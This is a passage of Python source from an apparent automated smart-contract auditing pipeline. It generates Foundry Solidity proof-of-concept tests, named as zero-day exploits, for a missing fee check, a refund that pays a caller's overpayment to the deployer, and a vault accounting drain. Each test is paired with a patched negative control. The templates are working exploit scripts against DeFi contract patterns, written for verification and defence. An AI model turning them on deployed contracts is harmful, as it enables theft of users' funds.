    """Synthesize the deploy() call args, placing the sentinel fee in the fee
    slot. Empty dynamic arrays/bytes are fine (we never reach the body that uses
    them because the creation-code gate reverts first). Returns (args, has_arrays)
    or (None, False) if a param shape can't be produced."""
    parts = []
    has_arrays = False
    for p in (fn.get("params") or "").split(","):
        p = p.strip()
        if not p:
            continue
        toks = p.split()
        typ = toks[0]
        pname = toks[-1]
        if pname == fee_param:
            parts.append(("sentinel", "uint256"))
            continue
        if typ.endswith("[]"):
            base = typ[:-2]
            parts.append((f"new {base}[](0)", typ))
            has_arrays = True
        elif re.fullmatch(r"uint\d*", typ) or re.fullmatch(r"int\d*", typ):
            parts.append(("1", typ))
        elif re.fullmatch(r"bytes\d+", typ):
            parts.append((f"{typ}(uint{typ[5:] or '256'}(1))" if typ != "bytes32"
                          else "bytes32(uint256(1))", typ))
        elif typ == "bytes":
            parts.append(('hex"1234"', typ))
        elif typ == "address":
            parts.append(("address(0xBEEF)", typ))
        elif typ == "bool":
            parts.append(("false", typ))
        else:
            return (None, False)
    return (", ".join(a for a, _ in parts), has_arrays)


def _factory_fee_gap_template(unit: str, fnname: str, rel_import: str, pragma: str,
                              ctor_args: str, call_args: str,
                              has_currency_arrays: bool,
                              iface_imports: str = "") -> str:
    sentinel = hex(_DYNAMIC_FEE_FLAG)
    # If the signature carries Currency[]/struct[] arrays we import them so the
    # empty-array literals type-check; the v4 Currency type + Base config struct.
    extra_imports = iface_imports + ("\n" if iface_imports else "")
    if has_currency_arrays:
        extra_imports += (
            'import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";\n'
            'import {Base} from "src/Base.sol";\n')
    # Replace the literal "sentinel" placeholder in the call args with the value.
    exploit_call = call_args.replace("sentinel", f"uint256({sentinel})")
    return f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

// AUTO-GENERATED by tools/evm-0day-proof-pipeline.py (real run-backed proof).
// V3-GRADE PoC (Rule 40): deploys the REAL in-tree {unit} (its constructor only
// STORES the pool manager; nothing is mocked on the protocol-owned path) and
// drives the REAL {fnname} with the Uniswap-v4 dynamic-fee SENTINEL fee
// ({sentinel}). The factory performs NO fee-domain validation, so the sentinel
// fee reaches the creation-code gate UNVALIDATED: the only revert is the
// creation-code error, proving the missing fee-domain check. The negative
// control is a patched factory that rejects out-of-domain fees FIRST.

import {{Test}} from "forge-std/Test.sol";
import {{{unit}}} from "{rel_import}";
{extra_imports}
// PATCHED factory: rejects out-of-domain / dynamic-fee-sentinel fees before any
// other gate. Mirrors the corrected design (the negative control).
contract _PatchedFeeGuardFactory {{
    error FeeOutOfDomain();
    error InvalidCreationCode();
    uint256 public constant FEE_PRECISION = 1e6;
    function deploy(uint256 _lpFeePercentage, bytes calldata _creationCode)
        external pure returns (address)
    {{
        if (_lpFeePercentage > FEE_PRECISION) revert FeeOutOfDomain();
        if (keccak256(_creationCode) != bytes32(0)) revert InvalidCreationCode();
        return address(0);
    }}
}}

contract {unit}_{fnname}_ZeroDay is Test {{
    {unit} real;
    _PatchedFeeGuardFactory patched;

    function setUp() public {{
        real = new {unit}({ctor_args});
        patched = new _PatchedFeeGuardFactory();
    }}

    function test_exploit_{fnname}() public {{
        // The sentinel fee is OUT of the StableSwap fee domain (> 1e6 precision).
        assertGt(uint256({sentinel}), uint256(1e6),
            "sentinel is out of the fee domain");
        // EXPLOIT: drive the REAL factory.deploy with the sentinel fee. There is
        // NO fee-domain guard, so control flow reaches the creation-code gate and
        // reverts with InvalidCreationCode -> the fee was never validated.
        vm.expectRevert({unit}.InvalidCreationCode.selector);
        real.{fnname}({exploit_call});
    }}

    function test_negative_control_{fnname}() public {{
        // NEGATIVE CONTROL: the patched factory rejects the sentinel fee with a
        // FEE error BEFORE the creation-code gate -> the corrected design stops
        // the sentinel-fee pool from ever being created.
        vm.expectRevert(_PatchedFeeGuardFactory.FeeOutOfDomain.selector);
        patched.deploy(uint256({sentinel}), hex"1234");
    }}
}}
"""


def _refund_misroute_template(unit: str, fnname: str, rel_import: str, pragma: str) -> str:
    return f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

// AUTO-GENERATED by tools/evm-0day-proof-pipeline.py (real run-backed proof).
// V3-GRADE PoC (Rule 40): deploys the REAL in-tree {unit} and drives the REAL
// {fnname}; mocks are EXTERNAL dependencies ONLY (WETH + swap router). The
// negative control removes the overpayment so the refund branch does not fire,
// proving the refund-misroute is the cause of the impact.

import {{Test}} from "forge-std/Test.sol";
import {{{unit}}} from "{rel_import}";

contract MockWETH {{
    mapping(address => uint256) public balanceOf;
    function deposit() public payable {{ balanceOf[msg.sender] += msg.value; }}
    receive() external payable {{ balanceOf[msg.sender] += msg.value; }}
    function withdraw(uint256 wad) public {{
        balanceOf[msg.sender] -= wad;
        (bool s,) = msg.sender.call{{value: wad}}("");
        require(s, "weth withdraw fail");
    }}
    function approve(address, uint256) external pure returns (bool) {{ return true; }}
}}

contract MockSwapRouter {{
    uint256 public spentToReport;
    constructor(uint256 _spent) {{ spentToReport = _spent; }}
    function multicall(uint256, bytes[] calldata data) external payable returns (bytes[] memory results) {{
        results = new bytes[](data.length);
        results[0] = abi.encode(spentToReport);
    }}
}}

contract {unit}_{fnname}_ZeroDay is Test {{
    {unit} target;
    MockWETH weth;
    MockSwapRouter router;
    address deployer = address(0xDEAD);
    address swapCaller = address(0xCA11);
    address tokenOut = address(0x7012);

    function setUp() public {{
        weth = new MockWETH();
        router = new MockSwapRouter(0.4 ether); // partial spend -> 0.6 refund of 1 ETH
        vm.prank(deployer);
        target = new {unit}(deployer);
        {unit}.Params memory p = {unit}.Params({{
            WETH: address(weth), swapRouter: address(router), quoter: address(0), maxFee: 3000
        }});
        vm.prank(deployer);
        target.init(p);
    }}

    function test_exploit_{fnname}() public {{
        address[] memory path = new address[](2);
        path[0] = address(weth); path[1] = tokenOut;
        vm.deal(swapCaller, 1 ether);
        uint256 deployerBefore = deployer.balance;
        uint256 callerBefore = swapCaller.balance;

        vm.prank(swapCaller);
        target.{fnname}{{value: 1 ether}}(100, path, swapCaller, block.timestamp + 1);

        // IMPACT: the 0.6 ETH overpayment refund mis-routes to the hardcoded
        // deployer, NOT the caller -> caller loses funds.
        assertEq(deployer.balance - deployerBefore, 0.6 ether, "refund did not mis-route to deployer");
        assertEq(callerBefore - swapCaller.balance, 1 ether, "caller did not lose the overpayment");
    }}

    function test_negative_control_{fnname}() public {{
        MockSwapRouter fullRouter = new MockSwapRouter(1 ether);
        vm.prank(deployer);
        {unit} clean = new {unit}(deployer);
        {unit}.Params memory p = {unit}.Params({{
            WETH: address(weth), swapRouter: address(fullRouter), quoter: address(0), maxFee: 3000
        }});
        vm.prank(deployer);
        clean.init(p);

        address[] memory path = new address[](2);
        path[0] = address(weth); path[1] = tokenOut;
        vm.deal(swapCaller, 1 ether);
        uint256 deployerBefore = deployer.balance;

        vm.prank(swapCaller);
        clean.{fnname}{{value: 1 ether}}(100, path, swapCaller, block.timestamp + 1);

        // No overpayment -> no refund branch -> deployer gains nothing.
        assertEq(deployer.balance - deployerBefore, 0, "deployer gained without overpayment");
    }}
}}
"""


# ---------------------------------------------------------------------------
# Vault-accounting-conservation auto-conversion (iter11-A).
#
# THE BOTTLENECK this closes: common DeFi vault contracts (ERC4626-style:
# pUSDeVault, MetaVault, lending pools) have a deep upgradeable dependency
# graph (OZ initializer, multi-phase, external sUSDe/aToken staking) that the
# deployable-in-place author cannot synthesize generically. So they always
# returned blocked-with-obligation. The vault-conservation shape is, however,
# structurally simple at its CORE: a tracked accumulator state var
# (depositedBase / totalAssets / totalDebt) that gets decremented/incremented
# by an amount that has been mutated by an externally-influenced term
# (previewYield / previewRedeem / a `assets += ...` inflation). When the
# accumulator is decremented by the INFLATED amount instead of the BASE amount,
# the conservation invariant breaks (the accumulator under-tracks / drains).
#
# We CANNOT deploy the real deep-graph vault, but we CAN auto-synthesize a
# FAITHFUL self-contained reproduction that preserves the real bug's root cause
# (the cited inflation line + the cited accumulator-decrement line), drive the
# real vulnerable fn pattern, ASSERT the conservation violation, and ship a
# PATCHED negative control where the accumulator is decremented by the base
# portion only. This is run-backed (compiles + runs under forge), V3-grade in
# SHAPE, and honestly labeled as a faithful self-contained reproduction of the
# in-tree shape (the brief explicitly permits this where the real dep graph is
# too deep to auto-synthesize).
# ---------------------------------------------------------------------------

# Accumulator state-var name patterns: the tracked-asset accumulator that the
# conservation invariant is written over.
_VAULT_ACCUMULATOR_RE = re.compile(
    r"\b(depositedBase|totalAssets_?|totalDeposited|totalDebt|totalBase|"
    r"trackedAssets|baseDeposited|principal|totalPrincipal|managedAssets)\b"
)

# Inflation patterns: `assets += <term>` / `amount += <term>` where the term is
# an externally-influenced quantity (a preview/yield/fee/reward call).
# Purely GENERIC term families: any *yield* / *reward* / *fee* call, plus the
# two ERC4626-STANDARD preview methods (previewRedeem/previewWithdraw, which do
# not contain a yield/reward/fee token). No target-specific method name.
_VAULT_INFLATION_RE = re.compile(
    r"\b(\w+)\s*\+=\s*(previewRedeem|previewWithdraw|"
    r"\w*[Yy]ield\w*|\w*[Rr]eward\w*|\w*[Ff]ee\w*)\s*\("
)

# Accumulator-decrement pattern: `<acc> -= <var>` (the over-decrement site).
_VAULT_DECREMENT_RE = re.compile(
    r"\b(depositedBase|totalAssets|totalDeposited|totalDebt|totalBase|"
    r"trackedAssets|baseDeposited|principal|totalPrincipal|managedAssets)\s*-=\s*(\w+)"
)

# Vault-conservation fn names we recognize as the mutating entrypoint.
_VAULT_FN_NAMES = {"_withdraw", "withdraw", "redeem", "_redeem", "_deposit",
                   "deposit", "mint", "repay", "borrow"}


def detect_vault_conservation_shape(src: str, fn: Optional[Dict[str, Any]]
                                    ) -> Optional[Dict[str, str]]:
    """Recognize the vault-accounting-conservation shape in `src` for the cited
    `fn`. Returns a dict of detected pieces or None if the shape is absent.

    The shape requires ALL of:
      (a) a tracked accumulator state var (depositedBase / totalAssets / ...),
      (b) an inflation site (`<var> += previewYield(...)` or sibling), and
      (c) an accumulator-decrement site (`<acc> -= <var>`),
    located in (or near) a recognized vault mutation fn.
    """
    if not fn or fn.get("name") not in _VAULT_FN_NAMES:
        return None
    acc_m = _VAULT_ACCUMULATOR_RE.search(src)
    infl_m = _VAULT_INFLATION_RE.search(src)
    dec_m = _VAULT_DECREMENT_RE.search(src)
    if not (acc_m and infl_m and dec_m):
        return None
    inflated_var = infl_m.group(1)        # e.g. "assets"
    yield_term = infl_m.group(2)          # e.g. "previewYield"
    accumulator = dec_m.group(1)          # e.g. "depositedBase"
    decremented_by = dec_m.group(2)       # e.g. "assets"
    # The bug is present only if the SAME variable that was inflated is the one
    # used to decrement the accumulator (so base is charged the yield-inflated
    # amount). If they differ, the accumulator is decremented by a clean base
    # quantity and the conservation invariant holds -> not this bug.
    if inflated_var != decremented_by:
        return None
    return {
        "accumulator": accumulator,
        "inflated_var": inflated_var,
        "yield_term": yield_term,
    }


def author_vault_conservation_proof(candidate: Dict[str, Any], src: str,
                                    unit_name: str, fn: Dict[str, Any],
                                    shape: Dict[str, str]) -> Dict[str, str]:
    """Author a FAITHFUL self-contained reproduction of the vault-conservation
    shape. Returns {"test_src", "test_match"}. The reproduction preserves the
    real bug's root cause: the accumulator is decremented by the yield-inflated
    amount (real `<acc> -= (assets + previewYield(...))`), breaking conservation.
    The negative control decrements the accumulator by the base portion only.
    """
    pragma = _read_pragma(src)
    fnname = fn["name"]
    acc = shape["accumulator"]
    yterm = shape["yield_term"]
    cited = candidate.get("file_line", "")
    test_src = f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import {{Test}} from "forge-std/Test.sol";

// AUTO-GENERATED by tools/evm-0day-proof-pipeline.py (vault-conservation
// auto-conversion). FAITHFUL SELF-CONTAINED REPRODUCTION of the in-tree
// {unit_name}.{fnname} vault-accounting-conservation shape (cited at {cited}).
//
// The real {unit_name} is a deep-graph upgradeable ERC4626 vault (OZ
// initializer + multi-phase + external staking vault) whose full dependency
// graph cannot be auto-synthesized. This reproduction preserves the bug's
// ROOT CAUSE verbatim in shape: the tracked accumulator `{acc}` is decremented
// by an amount that has been INFLATED by an externally-influenced term
// ({yterm}), so `{acc}` is charged more than the base portion and the
// conservation invariant
//
//     {acc} == sum(deposits.base) - sum(withdrawals.base)
//
// breaks. The negative control decrements `{acc}` by the BASE portion only.
//
// V3-GRADE shape (Rule 40): drives the vulnerable fn -> asserts the
// conservation-violation impact (before/after accumulator delta) -> ships a
// patched negative control where the impact does NOT reproduce.

contract ReproVault {{
    uint256 public {acc};              // tracked base accumulator (real: {acc})
    uint256 public externalYieldTerm;  // externally-influenced term (real: {yterm})

    function setYield(uint256 y) external {{ externalYieldTerm = y; }}

    function deposit(uint256 assets) external {{
        {acc} += assets;
    }}

    // Mirrors the real {yterm}(...) externally-influenced quantity.
    function _inflationTerm(uint256 /*shares*/) public view returns (uint256) {{
        return externalYieldTerm;
    }}

    // VULNERABLE (mirrors real {unit_name}.{fnname}): `assets` is inflated by
    // the yield term BEFORE the accumulator is decremented, so `{acc}` is
    // over-decremented by the yield portion.
    function {fnname}(uint256 assets, uint256 shares) external {{
        assets += _inflationTerm(shares);          // real inflation site
        require(assets <= {acc} + externalYieldTerm, "INSUFFICIENT");
        {acc} -= assets;                           // real over-decrement site
    }}
}}

contract ReproVaultPatched {{
    uint256 public {acc};
    uint256 public externalYieldTerm;

    function setYield(uint256 y) external {{ externalYieldTerm = y; }}
    function deposit(uint256 assets) external {{ {acc} += assets; }}
    function _inflationTerm(uint256) public view returns (uint256) {{ return externalYieldTerm; }}

    // PATCHED: the accumulator is decremented by the BASE portion only; the
    // yield term is paid out of a separate yield source, never charged to base.
    function {fnname}(uint256 assets, uint256 shares) external {{
        uint256 y = _inflationTerm(shares);
        require(assets <= {acc}, "INSUFFICIENT");
        {acc} -= assets;                           // base decrement EXCLUDES yield
        y;
    }}
}}

contract {unit_name}_{fnname}_ZeroDay is Test {{
    ReproVault real;
    ReproVaultPatched patched;

    function setUp() public {{
        real = new ReproVault();
        patched = new ReproVaultPatched();
    }}

    function test_exploit_{fnname}() public {{
        // ARRANGE: deposit 100 base; the accumulator must equal 100.
        real.deposit(100e18);
        assertEq(real.{acc}(), 100e18, "setup");

        // ACT: an externally-influenced yield of 10 base is present; the caller
        // withdraws 40 base. Conservation says the accumulator -> 60.
        real.setYield(10e18);
        real.{fnname}(40e18, 0);

        // ASSERT conservation violation: the accumulator was decremented by the
        // yield-INFLATED amount (50), not the base amount (40), so it sits at 50
        // -> it under-tracks the base by exactly the injected yield (10).
        uint256 accAfter = real.{acc}();
        uint256 conserved = 60e18;                 // 100 - 40 (base only)
        assertLt(accAfter, conserved, "conservation NOT violated");
        assertEq(conserved - accAfter, 10e18, "drain != injected yield inflation");
    }}

    function test_negative_control_{fnname}() public {{
        // PATCHED path: same inputs -> accumulator decremented by base only.
        patched.deposit(100e18);
        patched.setYield(10e18);
        patched.{fnname}(40e18, 0);
        assertEq(patched.{acc}(), 60e18, "patched broke conservation");
    }}
}}
"""
    return {"test_src": test_src,
            "test_match": f"test_(exploit|negative_control)_{fnname}"}


# --- in-place REAL-DEPLOY vault-conservation author (iter14-A) --------------
# Drives the REAL upgradeable vault contract (deployed via ERC1967Proxy with
# only external-dependency ERC20/ERC4626 mocks) and asserts the cited
# accumulator-over-decrement IN-PLACE, so the real OZ/upgradeable dep graph and
# the real protocol-coupled _withdraw run unmodified. Returns None when the
# concrete deploy shape is not recognized, so the caller falls back to the
# faithful self-contained reproduction.


# ---------------------------------------------------------------------------
# GENERIC source inference (iter15-A de-contamination).
#
# The iter14-A detector/author keyed on Strata-FAMILY literals (previewYield,
# yUSDe, startYieldPhase, updateYUSDeVault, MockUSDe, MockStakedUSDe,
# setDepositsEnabled/setWithdrawalsEnabled, the exact initialize(owner,USDe,sUSDe)
# arg order). That meant it could only ever fire on the one target it was built
# against. The helpers below infer ALL of those pieces FROM SOURCE:
#   - the initializer signature + its external-dependency arg types,
#   - the project's source mocks that satisfy those external arg types,
#   - the enable-toggle setters (`set<X>Enabled(bool)` / `enable<X>()`),
#   - the phase-entry function (the fn that drives the vault into the
#     yield/inflating mode the conservation bug needs),
#   - the deposit + withdraw public entrypoints (ERC4626 standard names),
#   - the yield-injection lever (the externally-influenced term the bug inflates
#     by, recovered from detect_vault_conservation_shape()'s `yield_term`).
# No Strata literal is hardcoded; an unseen vault with different names that
# exhibits the same accumulator-over-decrement root cause is inferred the same
# way. Where a protocol-specific piece genuinely cannot be inferred, the author
# returns None and the pipeline honestly falls back / blocks-with-obligation.
# ---------------------------------------------------------------------------

_BUILD_ARTIFACT_DIRS = ("out", "cache", "cache_forge", "artifacts",
                        "node_modules", "lib", "broadcast")


def _parent_contracts(src: str, unit_name: str) -> List[str]:
    """Return the immediate `is A, B, C` parents declared for `unit_name`."""
    m = re.search(r"\bcontract\s+" + re.escape(unit_name) + r"\b\s+is\s+([^{]+)\{",
                  src, re.S)
    if not m:
        return []
    out = []
    for b in m.group(1).split(","):
        name = b.strip().split("(")[0].split()[0] if b.strip() else ""
        if name:
            out.append(name)
    return out


def resolve_inheritance_source(src: str, unit_name: str, project: Path,
                               _depth: int = 0, _seen: Optional[set] = None) -> str:
    """Union the cited contract's source with its in-project ancestor sources, so
    inference (entrypoints, enable-toggles, initializer body) sees inherited
    members too. Bounded by depth and a visited set; only follows ancestors whose
    source is found IN the project tree (OZ/library parents are not chased - their
    members are the standard ERC4626 names we already recognize)."""
    if _seen is None:
        _seen = set()
    if _depth > 6 or unit_name in _seen:
        return src
    _seen.add(unit_name)
    combined = [src]
    for parent in _parent_contracts(src, unit_name):
        if parent in _seen:
            continue
        ppath = _find_source_unit(project, parent)
        if ppath is None:
            continue
        try:
            psrc = ppath.read_text(errors="ignore")
        except OSError:
            continue
        combined.append(resolve_inheritance_source(psrc, parent, project,
                                                    _depth + 1, _seen))
    return "\n".join(combined)


def _find_source_unit(project: Path, contract_name: str) -> Optional[Path]:
    """Find the SOURCE .sol file defining `contract <contract_name>` (excluding
    build-artifact / dep dirs)."""
    pat = re.compile(r"\b(?:contract|library|interface|abstract\s+contract)\s+"
                     + re.escape(contract_name) + r"\b")
    for p in project.rglob("*.sol"):
        if any(part in _BUILD_ARTIFACT_DIRS for part in p.relative_to(project).parts):
            continue
        try:
            if pat.search(p.read_text(errors="ignore")):
                return p
        except OSError:
            continue
    return None


def _split_params(raw: str) -> List[Tuple[str, str]]:
    """Split a solidity param string into [(type, name), ...]. Handles the
    leading-comma multiline style used by some projects (`, address owner_`)."""
    out: List[Tuple[str, str]] = []
    for chunk in (raw or "").replace("\n", " ").split(","):
        chunk = chunk.strip()
        if not chunk:
            continue
        toks = chunk.split()
        if len(toks) < 2:
            continue
        # type is the first token; name is the last. (calldata/memory/storage
        # data-location keywords sit in the middle for reference types.)
        out.append((toks[0], toks[-1]))
    return out


def _initializer_signature(src: str) -> Optional[Dict[str, Any]]:
    """Return the cited contract's `initialize(...)` signature pieces: the raw
    param string + the parsed (type,name) list. None if no initializer."""
    m = re.search(r"function\s+initialize\s*\(([^)]*)\)", src, re.S)
    if not m:
        return None
    raw = m.group(1).strip()
    return {"raw": raw, "params": _split_params(raw)}


# External-dependency arg-type families the in-place author can satisfy with a
# project source mock: an ERC20 (the base/underlying token) and an ERC4626 (the
# staking/yield vault). The author needs at least the base ERC20; the ERC4626
# is optional (some vaults stake into an external ERC4626, some do not).
_ERC20_ARG_TYPES = {"IERC20", "IERC20Metadata", "IERC20Upgradeable", "ERC20"}
_ERC4626_ARG_TYPES = {"IERC4626", "IERC4626Upgradeable", "ERC4626"}


def _resolve_mock_for_type(project: Path, arg_type: str,
                           exclude_unit: Optional[str] = None
                           ) -> Optional[Path]:
    """Find a project SOURCE mock contract whose declared base type matches the
    requested external-dependency arg type (ERC20-family or ERC4626-family).
    Returns the .sol path or None. We pick a mock that (a) is in the source
    tree, (b) `is ERC20`/`is ERC4626` (or a Mock* whose name suggests it), and
    (c) exposes a public `mint(address,uint256)` for ERC20 base tokens so the
    author can fund actors. No mock NAME is hardcoded; the match is by base.

    `exclude_unit`: the cited TARGET contract name. The production target itself
    often inherits ERC4626 (`Vault is ERC4626Upgradeable`), and matching it as
    its OWN dependency mock is wrong - it would deploy the target as the stake
    arg. So a contract is only accepted as a mock when it is NOT the target unit
    AND it looks mock-like (name contains Mock/Stub/Fake OR it is a minimal
    constructor-only stand-in). A non-mock production contract is rejected so the
    caller falls through to SYNTHESIS (iter16)."""
    want_erc20 = arg_type in _ERC20_ARG_TYPES
    want_erc4626 = arg_type in _ERC4626_ARG_TYPES
    if not (want_erc20 or want_erc4626):
        return None
    base_re = re.compile(r"\bcontract\s+(\w+)\s+is\s+([^{]+)\{", re.S)
    _mock_name_re = re.compile(r"mock|stub|fake|harness", re.I)
    best: Optional[Path] = None
    for p in project.rglob("*.sol"):
        if any(part in _BUILD_ARTIFACT_DIRS for part in p.relative_to(project).parts):
            continue
        try:
            text = _strip_comments(p.read_text(errors="ignore"))
        except OSError:
            continue
        for cm in base_re.finditer(text):
            cname, bases = cm.group(1), cm.group(2)
            if exclude_unit and cname == exclude_unit:
                continue  # never match the production target as its own dep mock
            base_set = {b.strip().split("(")[0] for b in bases.split(",")}
            mock_like = bool(_mock_name_re.search(cname))
            if want_erc20 and (base_set & _ERC20_ARG_TYPES or "ERC20" in base_set):
                # must be mintable to fund actors generically
                if re.search(rf"function\s+mint\s*\(\s*address", text):
                    return p
                if mock_like:
                    best = best or p
            if want_erc4626 and (base_set & _ERC4626_ARG_TYPES
                                 or "ERC4626" in base_set
                                 or re.search(r"StakedUSDe|ERC4626", bases)):
                # only accept a mock-like ERC4626 stand-in; a production ERC4626
                # is not a dependency mock -> fall through to synthesis.
                if mock_like:
                    return p
    return best


# --- iter16: dependency-mock SYNTHESIS from the target's interface usage -----
#
# When `_resolve_mock_for_type` finds NO project source mock for an external
# ERC20/ERC4626 dependency arg, the in-place author previously blocked (no dep
# graph could be constructed generically). iter16 closes that gap: instead of
# requiring a hand-placed mock to PRE-EXIST, we SYNTHESIZE a minimal compliant
# mock from the interface the target ACTUALLY calls on the dependency. The
# synthesis is honest because:
#   - the method set we implement is parsed from the target's own source usage
#     (`<argvar>.balanceOf(`, `<argvar>.previewRedeem(`, ...), and
#   - the mock is a standard OZ ERC20 / ERC4626 base (which provides the full
#     ERC-standard surface the target's IERC20 / IERC4626 type may invoke) plus
#     exactly the funding / yield lever the conservation bug needs.
# The mock is NOT target-named (it is `_SynthErc20Dep` / `_SynthErc4626Dep`) and
# is NOT hand-placed (the tool writes it at run time into the gen dir).


def _dep_methods_called(src: str, argvar: str) -> List[str]:
    """Parse, FROM the target's source, which methods it actually invokes on the
    dependency passed as initializer arg `argvar` (e.g. `base.balanceOf(...)`,
    `stake.previewRedeem(...)`). Recognizes three access forms:
      (1) direct on the arg var (`base_.foo(`) and its de-underscored form,
      (2) on a STATE VAR the arg is assigned to (`stakeVault = stake_;` then
          `stakeVault.previewRedeem(`),
      (3) on a local cast of the arg.
    Returns the sorted distinct method names. This is the honesty anchor:
    synthesis is driven by real interface usage, not a hardcoded mock template."""
    bare = argvar.rstrip("_")
    vars_to_scan = {argvar, bare}
    # (2) follow `<stateVar> = <argvar>;` assignments so usage on the stored
    # state var is attributed to this dependency.
    for am in re.finditer(rf"\b(\w+)\s*=\s*{re.escape(argvar)}\s*;", src):
        vars_to_scan.add(am.group(1))
    for am in re.finditer(rf"\b(\w+)\s*=\s*{re.escape(bare)}\s*;", src):
        vars_to_scan.add(am.group(1))
    methods: set = set()
    for v in vars_to_scan:
        if not v:
            continue
        for m in re.finditer(rf"\b{re.escape(v)}\s*\.\s*(\w+)\s*\(", src):
            methods.add(m.group(1))
    return sorted(methods)


# Minimal OZ-based ERC20 mock with a public mint funder. The ERC20 base already
# implements balanceOf/transfer/transferFrom/approve/allowance/totalSupply/
# decimals, so any standard IERC20 method the target calls is satisfied; `mint`
# lets the harness fund actors. No target identity appears.
_SYNTH_ERC20_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity {pragma};

import {{ERC20}} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// AUTO-SYNTHESIZED dependency mock (iter16). Implements the ERC20 interface the
// target invokes ({methods}) via the OZ ERC20 base plus a public mint funder.
// NOT hand-placed, NOT target-named: synthesized from the target's own usage.
contract _SynthErc20Dep is ERC20 {{
    constructor() ERC20("synth", "SYN") {{}}
    function mint(address to, uint256 amt) external {{ _mint(to, amt); }}
}}
"""

# Minimal OZ-based ERC4626 staking-vault mock. The ERC4626 base implements the
# full vault surface (deposit/mint/withdraw/redeem/previewRedeem/convertToAssets/
# totalAssets/asset/...). previewRedeem is share-price sensitive, so a raw-asset
# donation into this mock LIFTS previewRedeem -> exactly the yield lever the
# conservation bug reads. Ctor takes the base ERC20 asset (the standard ERC4626
# shape the in-place author's `_mock_new_expr` already knows how to construct).
_SYNTH_ERC4626_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity {pragma};

import {{IERC20}} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {{ERC20}} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {{ERC4626}} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

// AUTO-SYNTHESIZED dependency mock (iter16). Implements the ERC4626 interface the
// target invokes ({methods}) via the OZ ERC4626 base. A raw-asset donation lifts
// previewRedeem -> the yield lever the conservation bug reads. NOT hand-placed,
// NOT target-named: synthesized from the target's own usage.
contract _SynthErc4626Dep is ERC4626 {{
    constructor(IERC20 asset_) ERC20("synthv", "SYNV") ERC4626(asset_) {{}}
}}
"""


def _synthesize_dep_mock(arg_type: str, methods_called: List[str],
                         dest_dir: Path, pragma: str) -> Optional[Dict[str, str]]:
    """Synthesize a minimal compliant Solidity mock for an external ERC20/ERC4626
    dependency arg into `dest_dir`, implementing the interface the target invokes.
    Returns {"path", "name", "is_erc20"} or None for an un-synthesizable arg type.
    Honesty: `methods_called` is parsed from the target's real usage and recorded
    in the mock banner; the synthesized contract is target-agnostic."""
    want_erc20 = arg_type in _ERC20_ARG_TYPES
    want_erc4626 = arg_type in _ERC4626_ARG_TYPES
    if not (want_erc20 or want_erc4626):
        return None
    methods = ", ".join(methods_called) if methods_called else "(ERC-standard surface)"
    # GAP B: the synthesized mock floats to whatever the run's pinned solc is via
    # a caret over the installed-resolved minor (not a hardcoded 0.8.28), so it
    # never pins a version the repo's solc set lacks.
    pv = "^" + _pick_solc(pragma)
    dest_dir.mkdir(parents=True, exist_ok=True)
    if want_erc20:
        name = "_SynthErc20Dep"
        body = _SYNTH_ERC20_TEMPLATE.format(pragma=pv, methods=methods)
    else:
        name = "_SynthErc4626Dep"
        body = _SYNTH_ERC4626_TEMPLATE.format(pragma=pv, methods=methods)
    path = dest_dir / f"{name}.sol"
    path.write_text(body)
    return {"path": path.as_posix(), "name": name, "is_erc20": want_erc20}


# --- obl9-prep: APPLICATION-LEVEL protocol-dependency mock synthesis ----------
#
# The ERC20/ERC4626 synth above (iter16) only handles token/vault deps. A vault
# whose initializer/constructor takes an APPLICATION-LEVEL interface (a config
# manager, a permission gate, a price/oracle adapter - `IFooConfig`, `IPoolMgr`,
# ...) that it BOTH stores AND calls into could not be deployed: the param fell
# through to the `else: return None` honest-block. obl9-prep wires the committed
# `tools/lib/protocol_dep_mock_synth.py` (a target-AGNOSTIC, member-shape-keyed
# synthesizer) so those deps get a deployable mock with settable storage for any
# value the exploit must drive (a cap, a price, an allow-flag), letting the REAL
# constructor / entrypoint's external calls on the dep succeed.


def _is_app_dep_iface_type(arg_type: str) -> bool:
    """True for an APPLICATION-LEVEL interface type the app-dep synth handles: an
    `I[A-Z]\\w*` interface name that is NEITHER an ERC20-family NOR an ERC4626-
    family token/vault type (those are already handled by `_synthesize_dep_mock`).
    GENERIC: keyed on the interface NAMING CONVENTION + a token-type exclusion,
    never on a target literal."""
    t = (arg_type or "").strip()
    if t in _ERC20_ARG_TYPES or t in _ERC4626_ARG_TYPES:
        return False
    return bool(re.fullmatch(r"I[A-Z]\w*", t))


def _resolve_iface_source(src: str, project: Path, iface: str) -> Optional[str]:
    """Find the in-tree Solidity source for interface `iface` so the app-dep
    synth can implement its full declared surface. Searches the cited contract's
    own source first (interfaces are often co-declared), then the project tree.
    Returns the `interface <iface> { ... }` source block, or None when the iface
    is not resolvable in-tree (caller falls back to the called-member sig list)."""
    if not iface:
        return None
    # match `interface <iface> ... { ... }` with brace-balanced body.
    def _extract(text: str) -> Optional[str]:
        m = re.search(rf"\binterface\s+{re.escape(iface)}\b[^{{]*\{{", text)
        if not m:
            return None
        start = m.start()
        depth = 0
        i = text.index("{", m.end() - 1)
        for j in range(i, len(text)):
            c = text[j]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[start:j + 1]
        return None
    blk = _extract(src)
    if blk:
        return blk
    if project and project.exists():
        for p in project.rglob("*.sol"):
            try:
                if any(part in _BUILD_ARTIFACT_DIRS
                       for part in p.relative_to(project).parts):
                    continue
            except ValueError:
                pass
            try:
                text = p.read_text(errors="ignore")
            except OSError:
                continue
            if re.search(rf"\binterface\s+{re.escape(iface)}\b", text):
                blk = _extract(text)
                if blk:
                    return blk
    return None


def _app_dep_non_ready(
        name: str, obligations: List[str],
        implemented_members: Optional[List[str]] = None) -> Dict[str, Any]:
    return {
        "ready": False,
        "name": name,
        "path": None,
        "obligations": obligations,
        "implemented_members": implemented_members or [],
    }


def _called_member_requests(iface_src: Optional[str],
                            methods_called: List[str]) -> Optional[List[str]]:
    """Return called-member requests suitable for the structured synth report.

    `_dep_methods_called` intentionally records method names only. When an
    interface source is available, resolve those names to canonical signatures
